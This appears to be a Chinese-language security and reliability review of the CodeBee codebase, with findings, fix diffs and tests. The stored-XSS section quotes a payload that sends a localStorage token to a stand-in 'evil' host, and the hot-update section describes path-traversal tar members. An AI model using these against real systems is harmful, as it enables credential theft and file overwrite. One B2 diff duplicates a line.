# CodeBee 生产级打磨审查报告（L1→L4 汇总）

- 审查基线：`main` @ `2877530`（审查期间从 `4c400a2` 前进了一个提交；该提交只动 `CLI_COMPATIBILITY.md`/`TROUBLESHOOTING.md`/`scripts/cli_compat_record.py`/`tests/test_cli_compat_record.py`/`compat-records/`，本文引用的行号已按 `2877530` 复核）。
- 工作区另有他人未提交改动，全程未触碰、未暂存。
- 审查方式：全程只读 + 可复现探针；未启动、未请求、未绑定生产服务 `8765`；未新增任何运行时依赖
- 本文档是四个维度（架构 / 安全 / 性能 / 可维护性）的唯一汇总交付；分维度的过程记录不再重复

## 结论摘要

| 等级 | 数量 | 摘要 |
|---|---|---|
| P0 | 1 | 桌面热更新把 registry tarball 直接 `tarfile.extract()`，成员路径不受限且无摘要校验 |
| P1 | 6 | 前端内联处理器用 HTML 转义冒充 JS 转义（存储型 XSS）、访问令牌落入持久日志、手动模式评审不隔离模型族、CLI JSON 类型漂移可整轮崩溃、ACP 终端命令跑过任务、跨卷半更新使引擎不可用 |
| P2 | 5 | 瞬态降级不排除同上游、Git Bash 负缓存永久化、SSE 连接无上限、流式落盘 fsync 在全局锁内、`_run_serial_review` 2353 行 |
| P3 | 1 | `esc` / `jsq` 双工具无约束共存，是上一行 XSS 的结构性成因 |

三条上一轮结论在本轮被推翻或已由并行提交修复，见文末「结论变更」。所有条目给出现行 `file:line`（本轮重新核对，非沿用旧行号）。

## 1. 打磨总览

| # | 模块 | 维度 | 风险等级 | 一句话结论 | file:line |
|---|---|---|---|---|---|
| A1 | Electron 引擎热更新 | 安全 | P0 | 下载的 npm tarball 先解包后校验版本，且解包不限制成员路径/类型，归档可越界写用户文件 | `desktop/lib/backend.cjs:258` |
| A2 | Electron 引擎热更新 | 性能 | P1 | 跨卷降级用 `cpSync` 直写正式目录，中途失败留下残缺引擎，启动自愈不触发 | `desktop/lib/backend.cjs:295` |
| B1 | Web UI | 安全 | P1 | 内联事件处理器参数用 `esc()`（HTML 转义）代替 `jsq()`，实体被属性解析还原后闭合 JS 字符串 | `app/ui/app.js:2774` |
| B2 | 远程访问 | 安全 | P1 | 带 token 的配对 URL 打到 stdout，桌面端把 stdout 落进 `desktop-logs/backend.log` | `app/main.py:4907` |
| B3 | 对抗式评审 | 架构 | P1 | 手动模式走 `_pick_reviewer_legacy`，只排除作者 id，不做模型族/供应商/上游隔离 | `app/core/pipeline_code.py:184` |
| B4 | CLI 适配器 | 架构 | P1 | Codex/Claude 解析器假定 `usage` 等字段是对象，类型漂移时抛 `AttributeError` 逃出 `run_agent` | `app/core/cli_parsers.py:49` |
| B5 | ACP 适配器 | 性能 | P1 | `run_agent` 收尾只关连接，不取消未 `release` 的终端命令，命令可跑过任务生命周期 | `app/core/acp_client.py:419` |
| C1 | 智能路由 | 架构 | P2 | 瞬态失败换将只按 agent id 排除，不比较 CLI 命令/模型族/上游，可能换回同族同故障域 | `app/core/router.py:641` |
| C2 | CLI 探测 | 架构 | P2 | Git Bash 负结果写死进程级缓存，安装后不重启服务仍探不到 | `app/core/cli_commands.py:26` |
| C3 | Web UI / SSE | 性能 | P2 | `ThreadingHTTPServer` + 无连接上限的 SSE，连接数即线程数 | `app/main.py:3717` |
| C4 | 持久化 | 性能 | P2 | `stream_step` 每 0.6s 在全局 `LOCK` 内全量重写并 `fsync` run.json | `app/core/store.py:2687` |
| C5 | 编排引擎 | 可维护性 | P2 | `_run_serial_review` 2353 行单函数，评审生命周期无法独立测试 | `app/core/pipeline.py:3395` |
| D1 | Web UI | 零依赖纪律 | P3 | `esc`/`jsq` 无命名与静态约束，靠人肉记忆区分，B1 由此复发 | `app/ui/app.js:1700` |

## 2. P0 与 P1 逐条详述

### A1 · 热更新解包：无完整性校验 + 成员路径越界（P0）

**定位**：`desktop/lib/backend.cjs:246-275`（`hotUpdate`）

**证据**：

```js
await downloadTo(REGISTRY_TARBALL(version), tgz, 600000);
if (fs.statSync(tgz).size < 100000) throw new Error('引擎包异常（过小），已取消更新');
const extract = spawn(this.python, ['-E', '-s', '-X', 'utf8', '-c',
  'import sys, tarfile; t = tarfile.open(sys.argv[1]); members = [m for m in t.getmembers() if m.name == "package" or m.name.startswith("package/")]; [t.extract(m, sys.argv[2]) for m in members]; t.close()',
  tgz, staging], ...);
const bumped = JSON.parse(fs.readFileSync(path.join(pkg, 'package.json'), 'utf8')).version;
if (bumped !== version) throw new Error(`引擎包版本不符（${bumped} ≠ ${version}）`);
```

三重失守同时存在：

1. 下载后只校验「体积 > 100 KB」，没有比对 registry 的 `dist.integrity`；
2. 解包用 `tarfile.extract()`，成员名只判前缀 `package/`，`package/../../..` 这类名字照样匹配；
3. 版本核对在**解包之后**，即便核对失败，文件已经写出去了。

**后果场景（具体）**：能影响 `registry.npmjs.org` 响应的一方（被投毒的镜像/代理、企业内网 TLS 中间人、或被攻陷的发布账号）把 `codebee-<version>.tgz` 里塞入成员 `package/../../../../Users/<user>/AppData/Roaming/CodeBee/startup.js` 或覆盖 `resources/codebee/python/*`。用户在桌面端点「引擎更新」，下载并通过体积检查，解包阶段以桌面进程权限写出 staging 之外的文件；随后的版本号检查只让它「报错」，不撤销已发生的写入。下一次启动即执行被写入内容。

**攻击/触发路径（逐步）**：

1. 攻击者控制该版本 tarball 的响应体（镜像投毒 / 中间人 / 发布账号被盗）。
2. 用户点击桌面端「引擎更新」→ `hotUpdate(version)`。
3. `downloadTo` 走 HTTPS 但只认 host 白名单，不认内容；体积检查通过。
4. Python 子进程 `tarfile.extract()` 逐成员解包，成员名以 `package/` 开头即放行。
5. `../` 成员写到 `update-staging` 之外；`package.json` 版本比对此时才执行并抛错。
6. 用户看到「更新失败」，磁盘上被覆盖的文件已生效，下次启动加载。

**修复 diff（一个逻辑变更：先验完整性，再按安全规则解包）**：

```diff
--- a/desktop/lib/backend.cjs
+++ b/desktop/lib/backend.cjs
@@
-const { randomBytes } = require('node:crypto');
+const { randomBytes, createHash } = require('node:crypto');
@@
 const REGISTRY_TARBALL = version => `https://registry.npmjs.org/codebee/-/codebee-${version}.tgz`;
 const REGISTRY_HOSTS = new Set(['registry.npmjs.org']);
+
+/* npm 在 packument 里给每个版本发布 dist.integrity（sha512-…）。
+ * 没有它就无法区分「registry 给的包」和「链路上换过的包」。 */
+function fetchIntegrity(version, timeout = 15000) {
+  return new Promise((resolve, reject) => {
+    const request = https.get(`https://registry.npmjs.org/codebee/${version}`, { timeout }, response => {
+      if (response.statusCode !== 200) { response.resume(); reject(new Error(`读取发布元数据失败 HTTP ${response.statusCode}`)); return; }
+      let text = '';
+      response.setEncoding('utf8');
+      response.on('data', chunk => { text += chunk; if (text.length > 4 * 1048576) request.destroy(new Error('发布元数据过大')); });
+      response.on('error', reject);
+      response.on('end', () => {
+        try {
+          const integrity = String(JSON.parse(text)?.dist?.integrity || '');
+          if (!/^sha512-[A-Za-z0-9+/]+=*$/.test(integrity)) throw new Error('发布元数据缺少 sha512 完整性摘要，拒绝更新');
+          resolve(integrity);
+        } catch (error) { reject(error); }
+      });
+    });
+    request.on('timeout', () => request.destroy(new Error('读取发布元数据超时')));
+    request.on('error', reject);
+  });
+}
+
+function fileIntegrity(file, algorithm) {
+  return new Promise((resolve, reject) => {
+    const hash = createHash(algorithm);
+    fs.createReadStream(file)
+      .on('data', chunk => hash.update(chunk))
+      .on('error', reject)
+      .on('end', () => resolve(`${algorithm}-${hash.digest('base64')}`));
+  });
+}
+
+/* 解包器：逐成员校验，只允许 package/ 下的普通文件。 */
+const EXTRACT_SCRIPT = [
+  'import sys, tarfile',
+  'from pathlib import Path',
+  'root = Path(sys.argv[2]).resolve()',
+  'root.mkdir(parents=True, exist_ok=True)',
+  'with tarfile.open(sys.argv[1], "r:gz") as archive:',
+  '    members = archive.getmembers()',
+  '    if len(members) > 20000:',
+  '        raise SystemExit("too many archive members")',
+  '    total = 0',
+  '    for member in members:',
+  '        parts = member.name.replace("\\\\", "/").split("/")',
+  '        if not parts or parts[0] != "package" or any(p in ("", ".", "..") for p in parts):',
+  '            raise SystemExit("unsafe archive path: " + member.name)',
+  '        if member.isdir():',
+  '            continue',
+  '        if not member.isfile():',
+  '            raise SystemExit("links and special files are not allowed: " + member.name)',
+  '        total += member.size',
+  '        if total > 512 * 1024 * 1024:',
+  '            raise SystemExit("archive too large")',
+  '        target = (root / member.name).resolve()',
+  '        if target != root and root not in target.parents:',
+  '            raise SystemExit("path escape: " + member.name)',
+  '        target.parent.mkdir(parents=True, exist_ok=True)',
+  '        source = archive.extractfile(member)',
+  '        if source is None:',
+  '            raise SystemExit("unreadable member: " + member.name)',
+  '        with source, open(target, "wb") as out:',
+  '            while True:',
+  '                chunk = source.read(1048576)',
+  '                if not chunk:',
+  '                    break',
+  '                out.write(chunk)',
+].join('\n');
@@
-    await downloadTo(REGISTRY_TARBALL(version), tgz, 600000);
+    const integrity = await fetchIntegrity(version);
+    await downloadTo(REGISTRY_TARBALL(version), tgz, 600000);
     if (fs.statSync(tgz).size < 100000) throw new Error('引擎包异常（过小），已取消更新');
+    if (await fileIntegrity(tgz, 'sha512') !== integrity) {
+      throw new Error('引擎包完整性校验失败（与 registry 发布摘要不符），已取消更新');
+    }
     note('校验并解压引擎…');
     await new Promise((resolve, reject) => {
-      const extract = spawn(this.python, ['-E', '-s', '-X', 'utf8', '-c',
-        'import sys, tarfile; t = tarfile.open(sys.argv[1]); members = [m for m in t.getmembers() if m.name == "package" or m.name.startswith("package/")]; [t.extract(m, sys.argv[2]) for m in members]; t.close()',
-        tgz, staging], { cwd: this.dataDir, windowsHide: true, stdio: ['ignore', 'ignore', 'pipe'] });
+      const extract = spawn(this.python, ['-E', '-s', '-X', 'utf8', '-c', EXTRACT_SCRIPT,
+        tgz, staging], { cwd: this.dataDir, windowsHide: true, stdio: ['ignore', 'ignore', 'pipe'] });
```

**验证方式**：

1. 造一个成员为 `package/../../escape.txt` 的 tgz，把 `REGISTRY_TARBALL` 指到本地桩，点更新 → 现行代码写出 `escape.txt`，修复后报 `unsafe archive path` 且 staging 外无文件。
2. 造一个内容正确但摘要不匹配的 tgz → 修复后必须在解包前失败（断言 staging 目录为空）。
3. 现有 `tests/desktop_hotupdate_harness.cjs` 只覆盖 HTTPS/host/重定向/下载失败，需补「摘要不符」「成员越界」「符号链接成员」三例；运行 `node tests/desktop_hotupdate_harness.cjs`。

---

### A2 · 跨卷半更新：残缺引擎且自愈不触发（P1）

**定位**：`desktop/lib/backend.cjs:288-296`；自愈逻辑 `desktop/lib/backend.cjs:102-115`

**证据**：

```js
fs.renameSync(appDir, backup);
try {
  const newApp = path.join(pkg, 'app');
  try { fs.renameSync(newApp, appDir); }
  catch (renameError) {
    if (renameError.code !== 'EXDEV') throw renameError;
    fs.cpSync(newApp, appDir, { recursive: true });
    fs.rmSync(newApp, { recursive: true, force: true });
  }
```

```js
if (!fs.existsSync(this.script)) {          // 自愈的唯一触发条件
  ... 挑最新 app.bak-* → fs.cpSync 回滚
}
```

**后果场景**：staging 与安装目录不在同一卷（数据目录被重定向到 D 盘、应用装在 C 盘）时走 `cpSync` 分支。复制到一半进程被杀/磁盘满/文件被占用，`appDir` 已创建且 `app/main.py` 可能已存在（复制按目录序遍历），但 `app/ui`、`app/core` 缺失。下次启动 `fs.existsSync(this.script)` 为真 → 自愈不触发 → 引擎起不来，用户只能重装。即使 `main.py` 未复制到，回滚用 `cpSync` 直写 `appDir`，同样可能二次半更新。

**修复 diff（一个逻辑变更：跨卷走「临时目录 + 原子改名」）**：

```diff
--- a/desktop/lib/backend.cjs
+++ b/desktop/lib/backend.cjs
@@
       } catch (renameError) {
         if (renameError.code !== 'EXDEV') throw renameError;
-        fs.cpSync(newApp, appDir, { recursive: true });
-        fs.rmSync(newApp, { recursive: true, force: true });
+        // 跨卷不能 rename：先完整复制到同卷临时目录，再原子改名成 appDir。
+        // 中途失败时 appDir 仍不存在，start() 的「缺 script 就回滚」才有机会生效；
+        // 直接 cpSync 到 appDir 会留下「main.py 在、其余不全」的目录，自愈判据失效。
+        const incoming = appDir + '.incoming-' + Date.now();
+        fs.rmSync(incoming, { recursive: true, force: true });
+        try {
+          fs.cpSync(newApp, incoming, { recursive: true });
+          fs.renameSync(incoming, appDir);
+        } catch (copyError) {
+          fs.rmSync(incoming, { recursive: true, force: true });
+          fs.renameSync(backup, appDir);   // 立刻回滚，不等下次启动
+          throw copyError;
+        }
+        fs.rmSync(newApp, { recursive: true, force: true });
       }
```

**验证方式**：Windows 上用 `subst` 或把 `TUTTI_DATA` 指到另一卷，注入「复制第 N 个文件时抛错」的桩（`fs.cpSync` 打桩），断言失败后 `app/main.py` 与 `app/core/*` 同时存在或同时不存在，且 `app.bak-*` 被还原为 `app`。桌面端手工验证：更新中强杀进程，重启后能起且版本回退到旧版。

---

### B1 · 内联事件处理器用 `esc` 代替 `jsq`：存储型 XSS（P1）

**定位**：`app/ui/app.js:2774`、`3963`、`3967`、`3973`、`3979`、`3981`、`3984`、`3711`（模型名，共 12 处 `esc(m.name)`，其中 8 处在内联处理器参数位）；同类还有 `13879`/`13886`（运行产物文件名）、`9990`/`9991`（git stash ref）。工具函数：`app/ui/app.js:1700`（`esc`）与 `:1789`（`jsq`）。

**证据**：

```js
function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g,
    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}
...
'" onclick="availModelOp(\'' + esc(pid) + '\', \'' + esc(m.name) + '\', ' +
```

`esc()` 把 `'` 换成 `&#39;`。这在**文本节点**里安全，但在 `onclick="…"` 里，浏览器先把属性值做 HTML 实体解码，再把结果交给 JS 解析器——`&#39;` 又变回 `'`，JS 字符串照样被闭合。`jsq()`（`:1789`）同时转义 `\` 与 `'`，才是这个位置该用的工具，代码里也确实存在并被 `7155`、`17940` 等处正确使用，说明这是误用而非设计。

**后果场景（具体）**：用户在「供应商模型」里点「获取模型列表」，`m.name` 直接来自上游 `/v1/models` 的响应。一个被投毒或仿冒的 OpenAI 兼容网关返回模型名 `x');fetch('http://evil/'+localStorage.token)//`，该值经 `refreshProviderModels` 落进配置（持久化）、渲染成 chip 时进入 `onclick`，页面加载即执行——同源脚本可读 `localStorage`/`window.S` 里的一切，并通过已授权 API 直接 `POST /api/tasks` 建任务、读运行产物。同一路径也是配置导入/示例模板的注入面。

**修复 diff（一个逻辑变更：把内联处理器参数从 HTML 转义换成 JS 转义）**：

```diff
--- a/app/ui/app.js
+++ b/app/ui/app.js
@@
   return '<button type="button" class="avail-model' + cls + '" title="' + esc(label + " · " + tip) +
-    '" onclick="availModelOp(\'' + esc(pid) + '\', \'' + esc(m.name) + '\', ' +
+    '" onclick="availModelOp(\'' + jsq(pid) + '\', \'' + jsq(m.name) + '\', ' +
     (m.enabled ? "true" : "false") + ')">' + esc(m.name) + "</button>";
@@
-    ' onclick="editModelPrice(\'' + esc(pid) + '\', \'' + esc(m.name) + '\')">' + t("价") + "</span>";
+    ' onclick="editModelPrice(\'' + jsq(pid) + '\', \'' + jsq(m.name) + '\')">' + t("价") + "</span>";
@@
-    ' onclick="toggleModelImage(\'' + esc(pid) + '\', \'' + esc(m.name) + '\')">' + t("图") + "</span>";
+    ' onclick="toggleModelImage(\'' + jsq(pid) + '\', \'' + jsq(m.name) + '\')">' + t("图") + "</span>";
@@
-    '<button class="ghost small row-op" onclick="testModelBtn(\'' + esc(pid) + '\', \'' + esc(m.name) + '\')">' + t("测试") + '</button>' +
+    '<button class="ghost small row-op" onclick="testModelBtn(\'' + jsq(pid) + '\', \'' + jsq(m.name) + '\')">' + t("测试") + '</button>' +
@@
-    ' onclick="delModel(\'' + esc(pid) + '\', \'' + esc(m.name) + '\')">' + t("删除") + '</button>' +
+    ' onclick="delModel(\'' + jsq(pid) + '\', \'' + jsq(m.name) + '\')">' + t("删除") + '</button>' +
@@
-    '<button class="primary" onclick="saveModelPrice(\'' + esc(pid) + '\', \'' + esc(name) + '\')">' + t("保存") + '</button>');
+    '<button class="primary" onclick="saveModelPrice(\'' + jsq(pid) + '\', \'' + jsq(name) + '\')">' + t("保存") + '</button>');
@@
-          '" onclick="artRunPopup(\'' + esc(run.id) + "', '" + esc(f.name) + "', " + (Number(f.size) || 0) + ')"><svg class="ico" aria-hidden="true"><use href="#i-rocket"/></svg></button>'
+          '" onclick="artRunPopup(\'' + jsq(run.id) + "', '" + jsq(f.name) + "', " + (Number(f.size) || 0) + ')"><svg class="ico" aria-hidden="true"><use href="#i-rocket"/></svg></button>'
```

其余同构位置（`toggleModelSel`、`modelOp`、`gitWbStashPop`、`gitWbStashDrop`）按同一规则替换；不要动 `title="' + esc(...) + '"` 这类纯属性位置，`esc` 在那里是对的。

**验证方式**：

1. 手工：在「供应商模型」里手动添加模型名 `x');alert(1)//`，刷新页面 → 修复前弹窗，修复后按钮显示原文且点击正常。
2. 新增静态回归 `tests/test_ui_inline_handler_escaping.py`：扫描 `app/ui/*.js`，对每个 `onclick="…"`/`onchange="…"` 行内出现的 `esc(` 报错（白名单允许 `title=`/文本节点），与 `tests/test_ui_native_dialog_ban.py` 同一套路。
3. 回归：`python -m unittest discover -s tests -p "test_ui_*.py"`。

---

### B2 · 访问令牌被写进持久日志（P1）

**定位**：`app/main.py:4907`（公网）、`4949`、`4974`（局域网）、`4977`（Tailscale）；落盘点 `desktop/lib/backend.cjs:150-155`

**证据**：

```python
def _announce_public(url):
    print("[CodeBee] 公网     %s/?token=%s" % (url, tok))
...
        print("[CodeBee] 局域网   http://%s:%d/?token=%s   ← 手机同一 WiFi 直接打开" % (lan, args.port, tok))
```

```js
child.stdout.on('data', chunk => { log.write(chunk); ... });
```

token 是「所有非回环请求必须携带」的唯一凭据（`remote.py` 强制校验）。代码把完整 token 拼进 URL 打到 stdout；桌面端把 sidecar 的 stdout 原样写进 `%APPDATA%\CodeBee\desktop-logs\backend.log`（超 2 MB 才轮转一次，旧内容还会进 `backend.log.previous`）。

**后果场景（具体）**：任何拿到 `desktop-logs/backend.log` 的人（用户按客服/issue 模板上传日志、同步盘把 AppData 同步到云端、同一台机器的其他本机账号）都能直接 `http://<lan-ip>:<port>/?token=<值>` 接管服务：读全部任务与产物、`POST /api/tasks` 建任意任务（等于让 CLI 在本机执行任意指令）。日志不是「临时控制台输出」，它是可持久、可外传的证据文件——这与「控制台提示」的风险等级不同。

**修复 diff（一个逻辑变更：日志里只留掩码，完整链接走 UI）**：

```diff
--- a/app/main.py
+++ b/app/main.py
@@
+    # 配对地址进日志会把 bearer token 变成可外传的凭据：UI 的「手机连接」面板
+    # （/api/connect）仍给出带 token 的完整链接，控制台只留可读的定位信息。
     def _announce_public(url):
-        print("[CodeBee] 公网     %s/?token=%s" % (url, tok))
+        print("[CodeBee] 公网     %s/?token=***（完整带令牌链接见「手机连接」面板）" % url)
@@
-    elif remote.PUBLIC_URL:
-        print("[CodeBee] 公网     %s/?token=%s   ← 任何网络可访问（反代回源已强制校验令牌）"
-              % (remote.PUBLIC_URL, tok))
+    elif remote.PUBLIC_URL:
+        print("[CodeBee] 公网     %s/?token=***   ← 任何网络可访问（反代回源已强制校验令牌）"
+              % remote.PUBLIC_URL)
+        print("[CodeBee] 公网     %s/?token=***   ← 任何网络可访问（反代回源已强制校验令牌）"
+              % remote.PUBLIC_URL)
@@
-            print("[CodeBee] 局域网   http://%s:%d/?token=%s   ← 手机同一 WiFi 直接打开" % (lan, args.port, tok))
+            print("[CodeBee] 局域网   http://%s:%d/?token=***   ← 手机同一 WiFi 直接打开" % (lan, args.port))
@@
-            print("[CodeBee] Tailscale http://%s:%d/?token=%s   ← 外网随时随地访问" % (ts, args.port, tok))
+            print("[CodeBee] Tailscale http://%s:%d/?token=***   ← 外网随时随地访问" % (ts, args.port))
```

**验证方式**：`python app/main.py --port <临时端口> --host 0.0.0.0 --no-public-tunnel`，grep 启动输出无 64 位十六进制串；打开 UI「手机连接」面板仍能拿到完整 URL 并成功访问。回归点：`tests/` 内所有断言启动输出含 `token=` 的用例需同步改（`grep -rn "token=" tests/*.py`）。

---

### B3 · 手动模式评审不隔离模型族（P1）

**定位**：`app/core/pipeline_code.py:184-188`、`app/core/pipeline.py:3216-3225`

**证据**：

```python
    elif mode in ("auto", "expert"):
        reviewer, route["reviewer"] = _pl().router.pick_reviewer(
            agents, impl, "code", stats, difficulty=difficulty)
    else:
        reviewer, route["reviewer"] = _pl()._pick_reviewer_legacy(agents, impl)
```

```python
def _pick_reviewer_legacy(agents, impl):
    """手动模式评审者选择（v1 逻辑：跨厂商 > mock-b > 自评）。"""
    real = _real(agents)
    for a in real:
        if a["id"] != impl["id"]:
            return a, ""
```

`router.pick_reviewer`（`app/core/router.py:801`）会算 `_review_identity` 并按模型族/供应商/上游做隔离，`_pick_reviewer_legacy` 只看 id 不同。

**后果场景（具体）**：用户配了 `agentA`（openai/gpt-5）与 `agentB`（也是 openai/gpt-5，换了个 CLI 壳），手动模式实现者选 `agentA`。评审者按顺序取到 `agentB`，`route["reviewer"]` 为空字符串，报告里也没有「同族」备注——用户以为拿到了跨厂商对抗评审，实际是同族同盲区互评，评审通过率虚高。

**修复 diff（一个逻辑变更：手动模式也用隔离选择器）**：

```diff
--- a/app/core/pipeline_code.py
+++ b/app/core/pipeline_code.py
@@
-    elif mode in ("auto", "expert"):
-        reviewer, route["reviewer"] = _pl().router.pick_reviewer(
-            agents, impl, "code", stats, difficulty=difficulty)
-    else:
-        reviewer, route["reviewer"] = _pl()._pick_reviewer_legacy(agents, impl)
+    else:
+        # 手动模式此前走 v1 选择器（只排除作者 id）：同族互评会被当成跨厂商
+        # 对抗评审。pick_reviewer 在无隔离候选时自带如实回退备注，行为不劣化。
+        reviewer, route["reviewer"] = _pl().router.pick_reviewer(
+            agents, impl, "code", stats, difficulty=difficulty)
```

`_pick_reviewer_legacy` 保留（其它调用点/测试可能仍引用），但不再从主流程进入。

**回归风险**：手动模式选出的评审者可能变化（这正是修复目的），依赖「手动模式选第一个非作者」的用例需改。验证：`python -m unittest tests.test_reviewer_isolation tests.test_review_cli_fallback -v`，并新增「手动模式 + 同族候选 + 异族候选」断言选到异族。

---

### B4 · CLI JSON 字段类型漂移令整轮异常退出（P1）

**定位**：`app/core/cli_parsers.py:49`、`:182`；调用点 `app/core/runner.py:2525`、`:2589`

**证据**：

```python
            u = ev.get("usage") or {}
            inp = int(u.get("input_tokens") or 0)
```
```python
    u = data.get("usage") or {}
    inp = int(u.get("input_tokens") or 0)
```

`or {}` 只挡 `None`/假值。上游把 `usage` 写成字符串 `"unknown"`、数字、或把 `input_tokens` 写成 `"1.2k"` 时，`u.get` 或 `int()` 抛 `AttributeError`/`ValueError`。这两行位于 `run_agent` 的解析段，`runner.py:2525`/`2589` 直接调用、没有就地兜底。

**后果场景（具体）**：某网关（本项目实测过自建网关把 `/v1/responses` 转成别的形状）返回 `{"type":"turn.completed","usage":"n/a"}`。`_parse_codex_jsonl` 抛 `AttributeError`，异常穿出 `run_agent` → 编排层收到的是内部异常而不是 `ok=False` 的可分类错误 → 错误分类（第 21 类 `UPSTREAM_CONFIG` 等）与换将白名单全部不生效，任务直接失败且日志里是 Python traceback，用户无法判断是 CLI、网关还是 CodeBee 的问题。这正好违背「错误消息须让用户不读源码判断归属」的验收标准。

**修复 diff（一个逻辑变更：解析器对字段类型做边界收敛）**：

```diff
--- a/app/core/cli_parsers.py
+++ b/app/core/cli_parsers.py
@@
-            u = ev.get("usage") or {}
-            inp = int(u.get("input_tokens") or 0)
-            out = int(u.get("output_tokens") or 0)
+            u = ev.get("usage")
+            u = u if isinstance(u, dict) else {}
+            inp = _int_or_zero(u.get("input_tokens"))
+            out = _int_or_zero(u.get("output_tokens"))
@@
-            usage["cached"] += int(u.get("cached_input_tokens") or 0)
-            usage["reasoning"] += int(u.get("reasoning_output_tokens") or 0)
+            usage["cached"] += _int_or_zero(u.get("cached_input_tokens"))
+            usage["reasoning"] += _int_or_zero(u.get("reasoning_output_tokens"))
@@
-    u = data.get("usage") or {}
-    inp = int(u.get("input_tokens") or 0)
-    out = int(u.get("output_tokens") or 0)
+    u = data.get("usage")
+    u = u if isinstance(u, dict) else {}
+    inp = _int_or_zero(u.get("input_tokens"))
+    out = _int_or_zero(u.get("output_tokens"))
@@
-    cached = int(u.get("cache_read_input_tokens") or 0) + \
-        int(u.get("cache_creation_input_tokens") or 0)
+    cached = _int_or_zero(u.get("cache_read_input_tokens")) + \
+        _int_or_zero(u.get("cache_creation_input_tokens"))
@@
+def _int_or_zero(value):
+    """上游字段类型漂移（"n/a"、"1.2k"、None）不该让整轮解析炸掉：
+    用量是统计信息，不是判定依据。"""
+    try:
+        return max(0, int(value or 0))
+    except (TypeError, ValueError):
+        return 0
```

**验证方式**：临时桩 `_parse_codex_jsonl('{"type":"turn.completed","usage":"n/a"}\n')` 与 `_parse_claude_json('{"type":"result","result":"ok","usage":7}')` 均返回 `(text, usage, sid)` 且不抛异常；新增 `tests/test_cli_parser_type_drift.py`，一并补上正常 JSONL 的基线用例。

**顺带确认的缺口**：全仓 `grep -rn "cli_parsers" tests/` 为空——解析器至今零测试引用，`runner.py` 是唯一调用方。这也是 `usage` 类型漂移能一路走到生产的原因：没有任何用例固定「字段形状变化时解析器不炸」这一契约。

---

### B5 · ACP 终端命令跑过任务生命周期（P1）

**定位**：`app/core/acp_client.py:406-419`（创建）、`:603-611`（收尾）

**证据**：

```python
            terminal = {"output": "", "done": threading.Event(),
                        "cancel": threading.Event(), "released": False}
            terminals[terminal_id] = terminal
            ...
            threading.Thread(target=_run_terminal, name="acp-terminal", daemon=True).start()
```
```python
    finally:
        if connection is not None:
            connection.close()
```

`terminal/release` 会 `cancel`，`terminal/kill` 也会；但 `run_agent` 无论正常结束、超时还是异常，`finally` 只关连接，不遍历 `terminals` 取消未完成的命令。

**后果场景（具体）**：ACP agent 创建 `npm install`（10 分钟）后自己先结束会话（模型认为够了）。CodeBee 判定该步完成、收尾 run，用户在 UI 看到「已完成」并开始下一个任务；那个 `npm install` 仍在同一工作目录里跑，写 `node_modules`、改 lock 文件，与新任务的工作区改动互相污染。磁盘/CPU 也继续被占用到命令自行结束或 `deadline` 到期。

**修复 diff（一个逻辑变更：任务收尾统一取消并等待未完成终端）**：

```diff
--- a/app/core/acp_client.py
+++ b/app/core/acp_client.py
@@
-            threading.Thread(target=_run_terminal, name="acp-terminal", daemon=True).start()
+            terminal["thread"] = threading.Thread(
+                target=_run_terminal, name="acp-terminal", daemon=True)
+            terminal["thread"].start()
@@
     finally:
+        # 任务收尾（正常/超时/异常）必须连终端命令一起收：否则 agent 先结束时
+        # 命令继续在新任务的工作目录里写文件，run 已标记完成却还在改盘。
+        pending = [t for t in terminals.values() if not t["done"].is_set()]
+        for terminal in pending:
+            terminal["cancel"].set()
+        stop_by = time.monotonic() + 2.0
+        for terminal in pending:
+            thread = terminal.get("thread")
+            if thread is not None:
+                thread.join(max(0.0, stop_by - time.monotonic()))
         if connection is not None:
             connection.close()
```

**验证方式**：桩 ACP agent 收到 `terminal/create` 后回 `session/update=end_turn` 但命令仍在 sleep；断言 `run_agent` 返回后 2 s 内该进程被 `runner._kill_tree` 收掉、临时工作区无后续写入。新增 `tests/test_acp_terminal_lifecycle.py`。

## 3. P2 与 P3 清单

| 条目 | 状态 | 提交 |
|---|---|---|
| C1 瞬态换将同故障域 | 已修 | `a183971` |
| C2 Git Bash 负缓存永久 | 已修 | `463a28b` |
| C3 SSE 连接无上限 | 已修 | `201a9b2` |
| C4 流式落盘 fsync | 已量化并修 | `c7fb114` |
| C5 `_run_serial_review` 拆分 | 未做（需独立重构） | — |
| D1 `esc`/`jsq` 命名约束 | 部分（静态 + 行为回归兜底，不改名，理由见 §9） | `3a57267` `9213d09` |

### 智能路由

- **C1 · 瞬态降级不排除同上游（`app/core/router.py:641`）**：`_choose()` 优先按策略后备链 id，兜底 `pick()` 按分数，两者都不看模型族/上游；只有配额与 403（`dead_upstreams`/`blocked_upstreams`）才做上游去重。后果：网关 5xx/超时（同账号同网关）时换将后仍撞同一故障域，白烧一轮并延后真正的跨族降级。建议在 `_choose` 内先按「`agent_upstreams` 与失败者无交集 且 `_review_identity` 族不同」筛选，候选耗尽再兼容回退并把原因写进 `reason`。注意这属于行为变更（换将顺序变了），需产品确认后再改。**已落地 `a183971`（用户确认后实施）**：只重排不扩池、死者身份未知不重排、隔离耗尽保持原选择，见 §8。验证：`python -m unittest tests.test_routing_strategy tests.test_ledger_down_routing -v`。
- **C2 · Git Bash 负缓存永久化（`app/core/cli_commands.py:17、26-37`）**：`_bash_cache["done"] = True` 在 `which()` 之前置位，探不到就永久返回 `None`。服务进程 PATH 是启动快照，用户中途装完 Git 后 claude 仍拿不到 `CLAUDE_CODE_GIT_BASH_PATH`，只能重启。**已落地 `463a28b`**：正结果永久缓存，负结果 60 s TTL（比建议的 30 s 略长，吸收一次任务里反复 spawn）。验证：桩 `shutil.which` 先返回 `None` 再返回路径，断言第二次调用能拿到。
- **C3 · SSE 连接无上限（`app/main.py:3717`，服务 `:4295` 为 `ThreadingHTTPServer`）**：每个 SSE 连接占一个线程，`_api_events` 只有在客户端断开时才退出；没有并发上限也没占用统计。多端/页面反复刷新（旧连接未及时关闭）时线程数线性增长，叠加每连接 ~0.5 MB 压缩 payload，长任务大屏会逐步变慢。**已落地 `201a9b2`**：默认上限 32（`CODEBEE_SSE_MAX` 可调），超限 503 + `Retry-After`，槽位在 finally 归还。验证：起隔离实例，循环建 100 个 SSE 连接后看线程数是否封顶。
